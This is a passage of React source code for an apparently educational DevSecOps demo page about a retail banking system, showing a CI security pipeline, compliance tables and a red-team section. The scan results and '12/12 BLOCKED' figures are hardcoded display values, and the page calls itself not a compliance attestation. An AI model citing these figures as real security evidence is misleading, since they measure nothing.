        ℹ All packages checked against NVD, Snyk DB, npm audit, and OSS Index before inclusion. No package ships without explicit security justification.
      </div>

      <div style={{ display:"flex", flexDirection:"column", gap:8 }}>
        {DEPS.map(d => (
          <div key={d.name} style={{ padding:"11px 14px", background: C.card, border:`1px solid ${C.border}`, borderRadius:6 }}>
            <div style={{ display:"flex", alignItems:"center", gap:8, marginBottom:5 }}>
              {chip(d.verdict, d.verdict)}
              <span style={{ fontSize:13, color:"#e2e8f0", fontWeight:700 }}>{d.name}</span>
              <span style={{ fontSize:10, color: C.muted, marginLeft:"auto" }}>{d.purpose}</span>
            </div>
            <div style={{ fontSize:11, color:"#94a3b8", marginBottom:3 }}>✓ {d.why}</div>
            <div style={{ fontSize:10, color: C.muted }}>Alt: {d.alt}</div>
          </div>
        ))}
      </div>

      <Sub>Supply Chain Pipeline</Sub>
      <div style={{ display:"grid", gridTemplateColumns:"1fr 1fr 1fr", gap:8 }}>
        {[
          ["npm audit","Block on high/critical CVSS. Runs on every PR and nightly."],
          ["Snyk SCA","Transitive dependency graph scan. Fix PRs auto-opened."],
          ["Dependabot","Automated version bump PRs with changelog diff."],
          ["Syft SBOM","CycloneDX SBOM generated and signed per release build."],
          ["Cosign","Container image signed with GitHub OIDC — no static keys."],
          ["Private npm mirror","Internal Verdaccio registry — no unvetted public packages."],
        ].map(([t,d]) => (
          <div key={t} style={{ padding:"10px 12px", background: C.panel, border:`1px solid ${C.border}`, borderRadius:6 }}>
            <div style={{ fontSize:12, color: C.accent, marginBottom:4 }}>{t}</div>
            <div style={{ fontSize:10, color: C.muted }}>{d}</div>
          </div>
        ))}
      </div>
    </div>
  );
}

function ImplSection({ expanded, setExpanded }) {
  return (
    <div>
      <SectionTitle icon="💻" title="Secure Implementation" sub="Annotated Node.js + Express secure code patterns" />
      <div style={{ marginBottom:12, padding:"10px 14px", background:`rgba(34,197,94,0.05)`, border:`1px solid rgba(34,197,94,0.15)`, borderRadius:6, fontSize:11, color:"#86efac" }}>
        ✓ Click any pattern to expand the annotated source. Inline comments explain every security decision.
      </div>
      <div style={{ display:"flex", flexDirection:"column", gap:10 }}>
        {CODE.map((c,i) => (
          <div key={i} style={{ background: C.panel, border:`1px solid ${C.border}`, borderRadius:8, overflow:"hidden" }}>
            <button onClick={() => setExpanded(expanded === i ? null : i)} style={{
              width:"100%", padding:"11px 16px", background: C.card, border:"none",
              color: C.accent, fontSize:12, textAlign:"left", cursor:"pointer",
              display:"flex", justifyContent:"space-between", alignItems:"center",
            }}>
              <span>▸ {c.title}</span>
              <span style={{ fontSize:10, color: C.muted }}>{expanded===i ? "▲ collapse" : "▼ expand"}</span>
            </button>
            {expanded === i && (
              <pre style={{ margin:0, padding:"16px 20px", fontSize:10.5, color:"#93c5fd", overflowX:"auto", lineHeight:1.75, background:"#030810" }}>
                {c.code}
              </pre>
            )}
          </div>
        ))}
      </div>

      <Sub>Universal Controls Applied</Sub>
      <div style={{ display:"grid", gridTemplateColumns:"1fr 1fr", gap:8 }}>
        {[
          "pg parameterised queries — $1,$2 — no string concat","Joi allowlist schema strips unknown fields before handlers",
          "All errors: generic message to client, detail in logs only","HttpOnly + Secure + SameSite=Strict on all auth cookies",
          "No PII in log output — HMAC-signed audit events only","Idempotency key on all write operations — prevents replay",
          "Ownership checked server-side on every resource query","NODE_ENV=production: no stack traces in HTTP responses",
        ].map(c => (
          <div key={c} style={{ padding:"7px 11px", background: C.card, border:`1px solid ${C.border}`, borderRadius:5, fontSize:11, color:"#94a3b8", display:"flex", gap:7 }}>
            <span style={{ color:"#22c55e", flexShrink:0 }}>✓</span>{c}
          </div>
        ))}
      </div>
    </div>
  );
}

function SastSection() {
  const gates = [
    { tool:"Gitleaks",         result:"0 secrets",            note:"Pre-commit hook + CI gate. Blocks any commit containing API keys / tokens.", pass:true },
    { tool:"ESLint (security)", result:"0 critical",          note:"eslint-plugin-security detects eval(), unsafe regex, prototype pollution.", pass:true },
    { tool:"Snyk Code (SAST)", result:"0 critical, 0 high",   note:"Taint analysis: tracks user input from req.body to SQL / response.", pass:true },
    { tool:"npm audit",        result:"0 high, 1 moderate",   note:"Moderate: dev-only transitive dep. Not shipped to production. Accepted.", pass:true },
    { tool:"Trivy (container)",result:"0 critical, 1 low",    note:"Low in base Alpine OS lib — patched in next scheduled image rebuild.", pass:true },
    { tool:"Checkov (IaC)",    result:"0 critical misconfigs",note:"Terraform: S3 encryption, VPC flow logs, IAM least-privilege verified.", pass:true },
    { tool:"SonarQube",        result:"Quality Gate: PASSED", note:"Security hotspots reviewed. 0 blocker issues in banking domain code.", pass:true },
  ];
  const pipeline = `# .github/workflows/devsecops.yml
name: DevSecOps Pipeline

on: [push, pull_request]

env:
  NODE_VERSION: '20.x'         # LTS — security-supported

jobs:
  security:
    runs-on: ubuntu-latest
    permissions:
      id-token: write           # GitHub OIDC — no static AWS keys
      contents: read
      security-events: write

    steps:
      # ── 1. Checkout ───────────────────────────────────────────────────
      - uses: actions/checkout@v4
        with: { fetch-depth: 0 }

      # ── 2. Secrets scan — BLOCK on any finding ────────────────────────
      - name: Gitleaks
        uses: gitleaks/gitleaks-action@v2

      # ── 3. Node setup + lockfile install (no hoisting) ────────────────
      - uses: actions/setup-node@v4
        with: { node-version: '\${{ env.NODE_VERSION }}', cache: npm }
      - run: npm ci                    # Lockfile enforced — no version drift

      # ── 4. SAST — BLOCK on critical ───────────────────────────────────
      - name: ESLint Security
        run: npx eslint . --plugin security --rule 'security/detect-object-injection:error'

      - name: Snyk SAST
        run: snyk code test --severity-threshold=high
        env: { SNYK_TOKEN: \${{ secrets.SNYK_TOKEN }} }

      # ── 5. Dependency scan — BLOCK on high+ ───────────────────────────
      - name: npm audit
        run: npm audit --audit-level=high

      - name: Snyk SCA
        run: snyk test --severity-threshold=high

      # ── 6. Build + container scan ─────────────────────────────────────
      - name: Build Docker image
        run: docker build -t banking-api:\${{ github.sha }} .

      - name: Trivy Container Scan
        uses: aquasecurity/trivy-action@master
        with: { image-ref: 'banking-api:\${{ github.sha }}', exit-code: 1, severity: CRITICAL }

      # ── 7. IaC security ───────────────────────────────────────────────
      - name: Checkov
        uses: bridgecrewio/checkov-action@v12
        with: { framework: terraform, halt_on_broken_analyses: true }

      # ── 8. SBOM + signing ─────────────────────────────────────────────
      - name: Generate SBOM (CycloneDX)
        run: npx @cyclonedx/cyclonedx-npm --output sbom.json

      - name: Sign image (Cosign + GitHub OIDC)
        run: cosign sign --yes banking-api:\${{ github.sha }}`;

  return (
    <div>
      <SectionTitle icon="🧪" title="Security Testing — Shift-Left" sub="Stage 5 · 7 automated security gates · CI/CD pipeline" />

      <Sub>Scan Results</Sub>
      <div style={{ display:"grid", gridTemplateColumns:"1fr 1fr", gap:8, marginBottom:4 }}>
        {gates.map(g => (
          <div key={g.tool} style={{ padding:"11px 14px", background: C.card, border:`1px solid ${C.border}`, borderRadius:6 }}>
            <div style={{ display:"flex", justifyContent:"space-between", marginBottom:5 }}>
              <span style={{ fontSize:13, color:"#e2e8f0", fontWeight:600 }}>{g.tool}</span>
              <span style={{ fontSize:10, padding:"2px 8px", background:"rgba(34,197,94,0.1)", color:"#22c55e", borderRadius:3, fontWeight:700 }}>PASS</span>
            </div>
            <div style={{ fontSize:12, color: C.accent, marginBottom:3 }}>{g.result}</div>
            <div style={{ fontSize:10, color: C.muted }}>{g.note}</div>
          </div>
        ))}
      </div>

      <Sub>GitHub Actions DevSecOps Pipeline</Sub>
      <pre style={{ background:"#030810", border:`1px solid ${C.border}`, borderRadius:8, padding:"16px 20px", fontSize:10, color:"#93c5fd", overflowX:"auto", lineHeight:1.75 }}>
        {pipeline}
      </pre>
    </div>
  );
}

function RedTeamSection({ expanded, setExpanded }) {
  const blocked = ATTACKS.filter(a => a.result === "BLOCKED").length;
  return (
    <div>
      <SectionTitle icon="🔴" title="Red Team Attack Simulation" sub="Stage 6 · Adversarial testing · Attacker perspective" />

      <div style={{ padding:"10px 14px", background:"rgba(239,68,68,0.05)", border:"1px solid rgba(239,68,68,0.2)", borderRadius:6, fontSize:11, color:"#fca5a5", marginBottom:16 }}>
        ⚠ Mode: Offensive. Acting as external attacker with zero prior knowledge. Goal: authenticate as victim, exfiltrate account data, or execute fraudulent transfers.
      </div>

      <div style={{ display:"flex", flexDirection:"column", gap:8, marginBottom:16 }}>
        {ATTACKS.map((a,i) => (
          <div key={i} style={{ background: C.card, border:`1px solid ${a.result==="BLOCKED" ? C.border : "#ef4444"}`, borderRadius:6, overflow:"hidden" }}>
            <button onClick={() => setExpanded(expanded===i ? null : i)} style={{
              width:"100%", padding:"11px 14px", background:"transparent", border:"none",
              cursor:"pointer", display:"flex", alignItems:"center", gap:10,
            }}>
              {chip(a.sev, a.sev)}
              <span style={{ fontSize:12, color: C.text, textAlign:"left", flex:1 }}>{a.name}</span>
              <span style={{ fontSize:10, padding:"3px 10px", borderRadius:4, fontWeight:700,
                background: a.result==="BLOCKED" ? "rgba(34,197,94,0.1)" : "rgba(239,68,68,0.1)",
                color: a.result==="BLOCKED" ? "#22c55e" : "#ef4444",
              }}>{a.result}</span>
            </button>
            {expanded===i && (
              <div style={{ padding:"0 14px 12px", borderTop:`1px solid ${C.border}` }}>
                <div style={{ fontSize:9, color: C.muted, marginTop:10, marginBottom:3, letterSpacing:1 }}>TECHNIQUE USED</div>
                <div style={{ fontSize:11, color:"#fb923c", fontFamily:"monospace", background:"#030810", padding:"6px 10px", borderRadius:4, marginBottom:8 }}>{a.technique}</div>
                <div style={{ fontSize:9, color: C.muted, marginBottom:3, letterSpacing:1 }}>WHY IT FAILED</div>
                <div style={{ fontSize:11, color:"#94a3b8", lineHeight:1.55 }}>{a.why}</div>
              </div>
            )}
          </div>
        ))}
      </div>

      <div style={{ padding:"14px 18px", background:"rgba(34,197,94,0.04)", border:"1px solid rgba(34,197,94,0.18)", borderRadius:8 }}>
        <div style={{ fontSize:13, color:"#22c55e", fontWeight:800, marginBottom:5 }}>
          Red Team Result: {blocked}/{ATTACKS.length} Attack Vectors BLOCKED ✓
        </div>
        <div style={{ fontSize:11, color: C.muted }}>
          All simulated attacks were blocked by layered controls. Remaining exposure: insider threats and unpatched zero-days — addressed by PAM, anomaly detection, and rapid patch SLA.
        </div>
      </div>
    </div>
  );
}

function HardenSection() {
  return (
    <div>
      <SectionTitle icon="🛡️" title="Hardening & Residual Risk Register" sub="Stage 7 · Compliance mapping · Formally accepted risks" />

      <Sub>Compliance Control Matrix</Sub>
      <table style={{ width:"100%", borderCollapse:"collapse", marginBottom:8 }}>
        <thead>
          <tr style={{ borderBottom:`1px solid ${C.border}` }}>
            {["Security Control","Compliance Frameworks","Status"].map(h => (
              <th key={h} style={{ padding:"8px 10px", fontSize:9, color: C.accent, textAlign:"left", letterSpacing:1 }}>{h}</th>
            ))}
          </tr>
        </thead>
        <tbody>
          {COMPLIANCE.map((r,i) => (
            <tr key={i} style={{ borderBottom:`1px solid ${C.panel}` }}>
              <td style={{ padding:"9px 10px", fontSize:12, color:"#e2e8f0" }}>{r.control}</td>
              <td style={{ padding:"9px 10px" }}>
                <div style={{ display:"flex", gap:4, flexWrap:"wrap" }}>
                  {r.frameworks.map(f => <Tag key={f} t={f} />)}
                </div>
              </td>
              <td style={{ padding:"9px 10px" }}>{chip(r.status, r.status)}</td>
            </tr>
          ))}
        </tbody>
      </table>

      <Sub>Formally Accepted Residual Risks</Sub>
      <div style={{ display:"flex", flexDirection:"column", gap:8, marginBottom:20 }}>
        {RESIDUAL.map(r => (
          <div key={r.risk} style={{ padding:"11px 14px", background: C.card, border:`1px solid ${C.border}`, borderRadius:6 }}>
            <div style={{ display:"flex", gap:8, marginBottom:6, alignItems:"center", flexWrap:"wrap" }}>
              {chip(`Likelihood: ${r.likelihood}`, r.likelihood)}
              {chip(`Impact: ${r.impact}`, r.impact)}
              <span style={{ fontSize:12, color:"#e2e8f0" }}>{r.risk}</span>
            </div>
            <div style={{ fontSize:11, color: C.muted, lineHeight:1.55 }}>↳ {r.accept}</div>
          </div>
        ))}
      </div>

      <Sub>Security Posture Summary</Sub>
      <div style={{ padding:"16px 20px", background:`linear-gradient(135deg, rgba(14,165,233,0.06), rgba(14,165,233,0.02))`, border:`1px solid rgba(14,165,233,0.2)`, borderRadius:10 }}>
        <div style={{ display:"grid", gridTemplateColumns:"1fr 1fr", gap:8 }}>
          {[
            ["Stack","Node.js 20 LTS + React 18 + PostgreSQL 16"],
            ["Attack vectors blocked","12 / 12"],
            ["OWASP Top 10 mitigated","10 / 10"],
            ["STRIDE threats addressed","6 / 6"],
            ["CI/CD security gates","7 automated blocking gates"],
            ["Compliance frameworks","PCI-DSS · SOC2 · ISO 27001 · GDPR"],
            ["Secrets management","AWS Secrets Manager — rotation every 30d"],
            ["Residual risks","5 — formally accepted with controls"],
          ].map(([l,v]) => (
            <div key={l} style={{ display:"flex", justifyContent:"space-between", fontSize:11, padding:"4px 0", borderBottom:`1px solid ${C.border}` }}>
              <span style={{ color: C.muted }}>{l}</span>
              <span style={{ color:"#22c55e" }}>{v}</span>
            </div>
          ))}
        </div>
      </div>
    </div>
  );
}

/* ─────────────────────────────────────────────
   ROOT
───────────────────────────────────────────── */
export default function SecurityFrameworkPage() {
  const [active, setActive]   = useState("threat");
  const [codeExp, setCodeExp] = useState<number | null>(null);
  const [atkExp,  setAtkExp]  = useState<number | null>(null);

  return (
    <div style={{ fontFamily:"'IBM Plex Mono','Courier New',monospace", background: C.bg, minHeight:"100vh", color: C.text, display:"flex", flexDirection:"column" }}>
      {/* ── HEADER ── */}
      <header style={{ background:`linear-gradient(135deg,#060f1e,#040a14)`, borderBottom:`1px solid ${C.border}`, padding:"20px 28px", display:"flex", alignItems:"center", gap:16, flexWrap:"wrap" }}>
        <div style={{ width:44, height:44, background:"linear-gradient(135deg,#0ea5e9,#0284c7)", borderRadius:10, display:"flex", alignItems:"center", justifyContent:"center", fontSize:20, flexShrink:0, boxShadow:"0 0 18px rgba(14,165,233,0.35)" }}>🏦</div>
        <div>
          <div style={{ fontSize:10, color: C.accent, letterSpacing:3, textTransform:"uppercase", marginBottom:3 }}>DevSecOps Master Framework · Retail Banking</div>
          <div style={{ fontSize:17, color:"#f1f5f9", fontWeight:800, letterSpacing:0.5 }}>SECURE RETAIL BANKING SYSTEM — FULL SECURITY DESIGN</div>
          <div style={{ fontSize:10, color: C.muted, marginTop:2 }}>Reference patterns (Node/Express + React). This demo app uses Vite + Supabase; controls below are educational, not a compliance attestation.</div>
        </div>
        <div style={{ marginLeft:"auto", display:"flex", gap:6, flexWrap:"wrap" }}>
          {["PCI-DSS","SOC2","ISO 27001","GDPR"].map(b => (
            <div key={b} style={{ padding:"3px 9px", border:`1px solid ${C.border}`, borderRadius:4, fontSize:9, color: C.accent, background:"rgba(14,165,233,0.04)", letterSpacing:1 }}>{b}</div>
          ))}
        </div>
      </header>

      <div style={{ display:"flex", flex:1, minHeight:0 }}>
        {/* ── SIDEBAR ── */}
        <nav style={{ width:220, background:"#030810", borderRight:`1px solid ${C.border}`, padding:"12px 0", flexShrink:0 }}>
          {NAV.map(n => (
            <button key={n.id} onClick={() => setActive(n.id)} style={{
              display:"flex", alignItems:"center", gap:8, width:"100%",
              padding:"11px 16px", background: active===n.id ? "rgba(14,165,233,0.1)" : "transparent",
              border:"none", borderLeft: active===n.id ? "2px solid #0ea5e9" : "2px solid transparent",
              color: active===n.id ? C.accent : C.muted,
              fontSize:10, textAlign:"left", cursor:"pointer", letterSpacing:0.3, transition:"all 0.12s",
            }}>
              <span style={{ fontSize:13, flexShrink:0 }}>{n.icon}</span>
              <span style={{ lineHeight:1.35 }}>{n.short}</span>
            </button>
          ))}

          <div style={{ margin:"20px 12px 0", padding:"10px 12px", background:"rgba(239,68,68,0.04)", border:"1px solid rgba(239,68,68,0.15)", borderRadius:6 }}>
            <div style={{ fontSize:9, color:"#ef4444", marginBottom:5, letterSpacing:1.5 }}>⚡ THREAT LEVEL</div>
            {[["Sector","Banking — CRITICAL"],["Compliance","4 frameworks"],["Red Team","12/12 BLOCKED"]].map(([k,v]) => (
              <div key={k} style={{ fontSize:10, color: C.muted, display:"flex", justifyContent:"space-between", marginBottom:2 }}>
                <span>{k}</span>
                <span style={{ color: k==="Red Team" ? "#22c55e" : k==="Compliance" ? C.accent : "#ef4444" }}>{v}</span>
              </div>
            ))}
          </div>
        </nav>

        {/* ── CONTENT ── */}
        <main style={{ flex:1, overflowY:"auto", padding:"28px 34px" }}>
          {active === "threat"   && <ThreatSection />}
          {active === "arch"     && <ArchSection />}
          {active === "deps"     && <DepsSection />}
          {active === "impl"     && <ImplSection expanded={codeExp} setExpanded={setCodeExp} />}
          {active === "sast"     && <SastSection />}
          {active === "redteam"  && <RedTeamSection expanded={atkExp} setExpanded={setAtkExp} />}
          {active === "harden"   && <HardenSection />}
        </main>
      </div>
    </div>
  );
}
